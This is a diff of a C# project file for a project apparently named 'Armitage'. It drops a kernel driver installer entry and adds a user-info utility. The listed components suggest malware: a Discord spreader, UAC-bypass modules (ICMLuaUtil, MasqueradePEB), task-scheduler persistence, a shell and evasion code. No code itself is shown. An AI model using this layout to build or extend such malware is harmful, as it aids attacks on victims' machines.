@@ -204,7 +204,6 @@
     <Compile Include="Armitage\Informer.cs" />
     <Compile Include="Armitage\Postman\Discord Spreader.cs" />
     <Compile Include="Armitage\Shell\Command Types.cs" />
-    <Compile Include="Armitage\Startup\Kernel Driver Installer.cs" />
     <Compile Include="Armitage\Startup\Task Scheduler.cs" />
     <Compile Include="Armitage\UAC\ICMLuaUtil.cs" />
     <Compile Include="Armitage\UAC\MasqueradePEB.cs" />
@@ -226,6 +225,7 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
       <DependentUpon>Settings.settings</DependentUpon>
     </Compile>
+    <Compile Include="Utilities\User Info.cs" />
     <Compile Include="Utilities\Zip Creator.cs" />
     <EmbeddedResource Include="Armitage\Evade\Epilepsy Generator.resx">
       <DependentUpon>Epilepsy Generator.cs</DependentUpon>
